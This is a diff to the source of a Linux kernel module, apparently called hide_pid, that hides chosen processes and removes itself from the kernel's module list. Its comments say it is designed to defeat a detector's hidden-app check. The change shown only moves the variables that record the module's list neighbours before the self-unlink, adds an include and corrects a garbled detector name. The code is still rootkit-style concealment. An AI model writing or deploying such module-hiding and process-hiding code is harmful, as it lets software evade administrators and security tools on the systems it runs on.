@@ -135,7 +135,7 @@
  * 7. KNOWN GAPS (by design, not bugs)
  *
  *  - Table-wide walks that never name a pid are untouched: kill(-1, 0) still
- *    returns 0. getpriority(PRIO_USER, uid), the channel the 鏄ョ detector uses
+ *    returns 0. getpriority(PRIO_USER, uid), the channel the 春秋 detector uses
  *    for its "hidden app list" check, is already handled by routine_raw.c.
  *  - Thread ids are not filtered; the match key is the group leader pid, which
  *    is what task_pid_nr()/ps show.
@@ -161,6 +161,7 @@
 #include <linux/cache.h>
 #include <linux/cred.h>
 #include <linux/jiffies.h>
+#include <linux/list.h>
 #include <linux/pid.h>
 #include <linux/pid_namespace.h>
 #include <linux/rcupdate.h>
@@ -645,6 +646,13 @@ static int kp_find_ge_pid_pre(struct kprobe *unused, struct pt_regs *regs)
  * being absent from the list rather than masquerading in it.
  */
 static bool hide_module_unlinked;
+/*
+ * Reinsertion needs the *original* neighbours, so they are recorded before the
+ * unlink. list_add(&m->list, &m->list) would not restore anything - it links
+ * the node to itself, which corrupts the list on the next walk.
+ */
+static struct list_head *hide_prev;
+static struct list_head *hide_next;
 
 static void hide_module_unlink(void)
 {
@@ -669,14 +677,6 @@ static void hide_module_unlink(void)
 
 	pr_info("hide_pid: module removed from the module list\n");
 }
-
-/*
- * Reinsertion needs the *original* neighbours, so the position is remembered
- * before the unlink. list_add(&m->list, &m->list) would not restore anything -
- * it links the node to itself, which corrupts the list on the next walk.
- */
-static struct list_head *hide_prev;
-static struct list_head *hide_next;
 
 static void hide_module_relink(void)
 {
